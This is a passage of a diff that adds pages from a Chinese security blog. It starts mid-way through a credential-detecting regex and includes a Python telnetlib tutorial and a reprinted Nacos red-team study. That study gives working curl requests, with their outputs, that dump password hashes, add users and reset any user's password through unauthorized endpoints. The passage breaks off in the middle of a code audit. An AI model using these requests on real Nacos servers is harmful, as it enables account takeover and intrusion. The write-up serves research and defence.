password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]&#123;0,25&#125;)(=|&gt;|:=|\|\|:|&lt;=|=&gt;|:).&#123;0,5&#125;[\&quot;]([0-9a-zA-Z\-_=]&#123;8,64&#125;)[\&quot;]&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<h2><span id="参考">参考</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://developer.huawei.com/consumer/cn/forum/topic/0204931065040020698?fid=0101592429757310384">密码密钥硬编码检查</a><br><a target="_blank" rel="noopener" href="https://github.com/deepfence/SecretScanner">SecretScanner</a><br><a target="_blank" rel="noopener" href="https://github.com/zricethezav/gitleaks">gitleaks</a><br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Android%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%85%E8%B0%88%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81.html">浅谈密钥硬编码</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/07/24/Python-Telnet/">
+                Python telnet模块说明
+            </a>
+        </h2>
+    
+    <time>
+        Jul 24, 2023
+    </time>
+    <section class="content">
+        <h1><span id="python-telnet模块说明">Python telnet模块说明</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41629756/article/details/102784236">三番鱼</a> 并作补充</p>
+</blockquote>
+<h2><span id="程序要点说明">程序要点说明</span></h2><blockquote>
+<p>python实现telnet客户端的六个关键问题及其答案是：<br>使用什么库实现telnet客户端—-telnetlib</p>
+</blockquote>
+<blockquote>
+<p>1.怎么连接主机—-两种方法，一种是在实例化时传入ip地址连接主机（tn &#x3D; telnetlib.Telnet(host_ip,port&#x3D;23)），第二种是，先不传参数进行实例化再用open方法连接主机（我这里使用的方法）</p>
+</blockquote>
+<blockquote>
+<p>2.怎么输入用户名密码—-我们使用read_untilb函数监听，出现标志后使用write方法向服务端传输用户名密码</p>
+</blockquote>
+<blockquote>
+<p>3.怎么执行命令—-仍然是使用write方法向服务端传送命令，不管向服务端传送什么数据都用write；不过要注意需要编码成bytes类型<br>注：该Telnet.write()函数采用字节字符串。这可以通过仅编码字符串（您尝试编码函数的返回值）来提供，例如：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.write(<span class="string">&quot;administrator\n&quot;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者通过为字符串添加前缀b如下：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"> </span><br><span class="line">host = <span class="string">&quot;192.168.1.0&quot;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">timeout = <span class="number">100</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> telnetlib.Telnet(host, port, timeout) <span class="keyword">as</span> session:</span><br><span class="line">    session.write(<span class="string">b&quot;administrator\n&quot;</span>)</span><br><span class="line">    session.write(<span class="string">b&quot;password\n&quot;</span>)</span><br><span class="line">    session.write(<span class="string">b&quot;reboot\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>4.怎么获取命令执行结果—-使用read_very_eager()方法，该方法获取的内容是上次获取之后本次获取之前的所有输入输出；由于获取到的是bytes类型要decode解码一下</p>
+</blockquote>
+<blockquote>
+<p>5.怎么退出telnet—退出telnet使用write方法向服务器提交exit命令即可</p>
+</blockquote>
+<h2><span id="程序源码清单">程序源码清单</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelnetClient</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,</span>):</span><br><span class="line">        self.tn = telnetlib.Telnet()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 此函数实现telnet登录主机</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login_host</span>(<span class="params">self,host_ip,username,password</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># self.tn = telnetlib.Telnet(host_ip,port=23)</span></span><br><span class="line">            self.tn.<span class="built_in">open</span>(host_ip,port=<span class="number">23</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s网络连接失败&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 等待login出现后输入用户名，最多等待10秒</span></span><br><span class="line">        self.tn.read_until(<span class="string">b&#x27;login: &#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        self.tn.write(username.encode(<span class="string">&#x27;ascii&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 等待Password出现后输入用户名，最多等待10秒</span></span><br><span class="line">        self.tn.read_until(<span class="string">b&#x27;Password: &#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        self.tn.write(password.encode(<span class="string">&#x27;ascii&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 延时两秒再收取返回结果，给服务端足够响应时间</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 获取登录结果</span></span><br><span class="line">        <span class="comment"># read_very_eager()获取到的是的是上次获取之后本次获取之前的所有输出</span></span><br><span class="line">        command_result = self.tn.read_very_eager().decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Login incorrect&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> command_result:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s登录成功&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s登录失败，用户名或密码错误&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 此函数实现执行传过来的命令，并输出其执行结果</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_some_command</span>(<span class="params">self,command</span>):</span><br><span class="line">        <span class="comment"># 执行命令</span></span><br><span class="line">        self.tn.write(command.encode(<span class="string">&#x27;ascii&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 获取命令结果</span></span><br><span class="line">        command_result = self.tn.read_very_eager().decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        logging.warning(<span class="string">&#x27;命令执行结果：\n%s&#x27;</span> % command_result)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 退出telnet</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">logout_host</span>(<span class="params">self</span>):</span><br><span class="line">        self.tn.write(<span class="string">b&quot;exit\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host_ip = <span class="string">&#x27;192.168.220.129&#x27;</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;abcd1234&#x27;</span></span><br><span class="line">    command = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">    telnet_client = TelnetClient()</span><br><span class="line">    <span class="comment"># 如果登录结果返加True，则执行命令，然后退出</span></span><br><span class="line">    <span class="keyword">if</span> telnet_client.login_host(host_ip,username,password):</span><br><span class="line">        telnet_client.execute_some_command(command)</span><br><span class="line">        telnet_client.logout_host()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>python 库 telnetlib: Telnet客户端:<br>telnetlib模块提供的Telnet类实现了Telnet协议。它为协议字符和telnet选项提供符号常量，符号常量来源于arpa&#x2F;telnet.h去掉了前缀TELOPT_</p>
+<p>1.Telnet.read_all(): 读取所有数据直到EOF，阻塞直到连接关闭<br>2.Telnet.read_some(): 读取至少一个字节的数据，除非EOF。如果没有数据则阻塞。<br>3.Telnet.read_until(expected[, timeout]):常用于登录，与write连用；读取直到遇到了给定的字符串expected或超时秒数<br>4.Telnet.read_very_eager(): 非阻塞地读取。连接关闭或者没有数据时触发EOFError异常，返回b’’如果没有数据。 获取命令执行结果：获取的内容是上次获取之后本次获取之前的所有输入输出<br>5.Telnet.read_eager(): 读取已有数据(快)<br>6.Telnet.read_lazy(): 读取已有数据(懒)<br>7.Telnet.read_sb_data(): 返回的SB&#x2F;SE pair(suboption begin&#x2F;end)之间的数据，此方法永远不会阻塞<br>8.Telnet.open(host[,port[,timeout]]): 连接到主机，可选的第二个参数是默认为标准的Telnet端口（23）的端口号。可选的超时参数（以秒指定）阻塞操作（如连接尝试超时（如果不指定，默认使用全局超时设置））<br>9.Telnet.msg(msg[, *args]): 当调试级别为&gt;0打印调试信息<br>10.Telnet.set_debuglevel(debuglevel)：设置调试级别。debuglevel越高信息越多。<br>11.Telnet.close() 关闭连接<br>12.Telnet.get_socket()：返回套接字供内部使用<br>13.Telnet.fileno(): 返回套接字对象内部使用的文件描述<br>14.Telnet.write(buffer): 常用于执行命令；写入字符串到套接字，加倍IAC的任何字符。连接关闭时可能触发OSError异常。<br>15.Telnet.interact(): 交由用户控制<br>16.Telnet.mt_interact(): 多线程版本的interact()<br>17.Telnet.expect(list[, timeout]): 读取直到匹配正则表达式项列表中的一个。list是一个正则表达式列表，包含编译(regx对象)或未编译（字节字符串）。timeout以秒为单位，默认值为无限期阻塞。返回元祖的三个项目：</p>
+<ul>
+<li>1.index为匹配正则表达式的位置；</li>
+<li>2.match对象</li>
+<li>3.此时读了的字节<br>18.Telnet.set_option_negotiation_callback(callback):每次从输入流读取telnet选项时，调用callback,后续步骤不会执行。</li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Python/" rel="tag">Python</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/07/24/Nacos-AccessToken/">
+                云原生组件Nacos新型红队手法研究
+            </a>
+        </h2>
+    
+    <time>
+        Jul 24, 2023
+    </time>
+    <section class="content">
+        <h1><span id="云原生组件nacos新型红队手法研究">云原生组件Nacos新型红队手法研究</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ">Zhuri</a> 并作补充</p>
+</blockquote>
+<h2><span id="组件简介">组件简介</span></h2><blockquote>
+<p>Nacos &#x2F;nɑ:kəʊs&#x2F; 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。<br>Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。<br>Nacos 帮助您更敏捷和容易地构建、交付和管理微服务平台。Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。</p>
+</blockquote>
+<h2><span id="历史漏洞">历史漏洞</span></h2><blockquote>
+<p>2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。<br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/1105">https://github.com/alibaba/nacos/issues/1105</a><br>在Nacos 2.0版本存在未授权访问漏洞，程序未有效对于用户权限进行判断，导致能够添加任意用户、修改任意用户密码等等问题。<br>这里就不做过多介绍了，网上有很多。<br>就在我撰写本文的时候，官方刚刚发布了最新的版本2.2.0 (Dec 14, 2022)，我们就来一探究竟。</p>
+</blockquote>
+<h2><span id="部署方式">部署方式</span></h2><blockquote>
+<p>为了方便起见，我这里使用Debian系统并采用的单机部署的方式。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install default-jdk</span><br><span class="line">sudo ufw <span class="built_in">disable</span></span><br><span class="line">wget https://github.com/alibaba/nacos/releases/download/2.2.0/nacos-server-2.2.0.zip</span><br><span class="line">unzip nacos-server-2.2.0.zip</span><br><span class="line"><span class="built_in">cd</span> nacos/bin</span><br><span class="line">bash startup.sh -m standalone</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>然后访问<a target="_blank" rel="noopener" href="http://ip:8848/nacos%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%87%BA%E7%8E%B0%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%B0%B1%E8%AF%B4%E6%98%8E%E9%83%A8%E7%BD%B2%E6%88%90%E5%8A%9F%E4%BA%86%EF%BC%8C%E9%BB%98%E8%AE%A4%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%B8%BAnacos/nacos%E3%80%82">http://ip:8848/nacos，如果出现登录界面，就说明部署成功了，默认的账号密码为nacos/nacos。</a></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>我们首先尝试使用老版本的payload尝试能不能打。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>不出意外，返回:</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">caused: Parameter conditions <span class="string">&quot;search=blur&quot;</span> OR <span class="string">&quot;search=accurate&quot;</span> not met <span class="keyword">for</span> actual request parameters: pageNo=&#123;1&#125;, pageSize=&#123;9&#125;;%</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们仔细看一下报错，提示说是缺少search&#x3D;blur或者search&#x3D;accurate，那我们加上再试试看。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=accurate&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>这就成功了？<br>我一开始以为没修，后来发现，我通过查看鉴权相关文档时(<a target="_blank" rel="noopener" href="https://nacos.io/en-us/docs/auth.html)%EF%BC%8C%E5%AE%83%E5%8F%AA%E6%8F%8F%E8%BF%B0%E4%BA%86%E5%A6%82%E4%BD%95%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%B8%8D%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83%E7%9A%84%E5%90%8E%E6%9E%9C%EF%BC%8C%E4%BD%86%E6%98%AF%E9%BB%98%E8%AE%A4%E5%90%AF%E5%8A%A8%E5%8D%B4%E4%B8%8D%E5%BC%80%E9%89%B4%E6%9D%83%E7%9A%84%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%A0%B9%E6%8D%AEgithub%E7%9A%84issue%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%AE%98%E6%96%B9%E5%B9%B6%E4%B8%8D%E8%AE%A4%E4%B8%BA%E8%BF%99%E6%98%AF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A5%E8%87%B3%E4%BA%8E%E7%BD%91%E4%B8%8A%E5%87%BA%E4%BA%86%E4%B9%8B%E5%89%8D%E7%94%B1%E4%BA%8E%E4%B8%8D%E5%BD%93%E5%A4%84%E7%90%86User-Agent%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%90%8E%E4%BA%BA%E5%B0%91%E6%9C%89%E6%8C%96%E6%8E%98%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%8C%E7%BD%91%E4%B8%8A%E7%9A%84%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E4%B9%9F%E5%9F%BA%E6%9C%AC%E4%B8%8A%E5%81%9C%E7%95%99%E5%9C%A8%E9%82%A3%E6%AC%A1CVE%E3%80%82">https://nacos.io/en-us/docs/auth.html)，它只描述了如何开启鉴权，以及不开启鉴权的后果，但是默认启动却不开鉴权的，并且根据github的issue来看，官方并不认为这是漏洞，以至于网上出了之前由于不当处理User-Agent导致的未授权访问漏洞之后，后人少有挖掘其利用方式，网上的相关资料也基本上停留在那次CVE。</a></p>
+</blockquote>
+<h2><span id="未开启auth">未开启auth</span></h2><blockquote>
+<p>由于默认是不开auth的，所以我们先来讨论未开启auth的情况。</p>
+</blockquote>
+<h3><span id="读取用户账号密码">读取用户账号密码</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;totalCount&quot;</span>:1,<span class="string">&quot;pageNumber&quot;</span>:1,<span class="string">&quot;pagesAvailable&quot;</span>:1,<span class="string">&quot;pageItems&quot;</span>:[&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;nacos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;$2a$10<span class="variable">$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu</span>&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<h3><span id="未授权添加用户">未授权添加用户</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?username=test1&amp;password=test1&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:200,<span class="string">&quot;message&quot;</span>:null,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;create user ok!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3><span id="任意用户密码更改">任意用户密码更改</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?accessToken=&#x27;</span> -H <span class="string">&#x27;User-Agent:Nacos-Server&#x27;</span> -d <span class="string">&#x27;username=test1&amp;newPassword=test2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>基本上目前主流针对Nacos的利用手法就停留在这里了，以至于防守方会通过WAF规则的形式来拦截掉这几个url请求。<br>但是根据代码审计以及官方的api接口文档，我们还能找到许多可以利用的接口，官方文档里面有的，我就不说了，大家自己可以去OpenAPI（<a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/open-api.html%EF%BC%89%E8%87%AA%E8%A1%8C%E6%9F%A5%E7%9C%8B%EF%BC%8C%E5%AE%98%E7%BD%91%E9%87%8C%E9%9D%A2%E7%9A%84OpenAPI%E6%89%80%E7%BB%99%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%B7%E5%80%BC%E5%B9%B6%E4%B8%8D%E6%98%AF%E5%BE%88%E9%AB%98%E3%80%82">https://nacos.io/zh-cn/docs/open-api.html）自行查看，官网里面的OpenAPI所给出的利用价值并不是很高。</a></p>
+</blockquote>
+<h3><span id="代码审计">代码审计</span></h3><blockquote>
+<p>下载源码后通过简单查找发现在<code>nacos/config/src/main/java/com/alibaba/nacos/config/server/constant/Constants.java</code>和<code>nacos/core/src/main/java/com/alibaba/nacos/core/utils/Commons.java</code>文件下，有相关路由的定义，相关代码如下：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_PATH</span> <span class="operator">=</span> <span class="string">&quot;/v1/cs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_V2_PATH</span> <span class="operator">=</span> <span class="string">&quot;/v2/cs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">OPS_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/ops&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CAPACITY_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/capacity&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COMMUNICATION_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/communication&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/configs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_CONTROLLER_V2_PATH</span> <span class="operator">=</span> BASE_V2_PATH + <span class="string">&quot;/config&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HEALTH_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/health&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HISTORY_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/history&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HISTORY_CONTROLLER_V2_PATH</span> <span class="operator">=</span> BASE_V2_PATH + <span class="string">&quot;/history&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LISTENER_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/listener&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NAMESPACE_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/namespaces&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">METRICS_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/metrics&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Commons</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_CONTEXT</span> <span class="operator">=</span> <span class="string">&quot;/nacos&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_VERSION</span> <span class="operator">=</span> <span class="string">&quot;/v1&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> 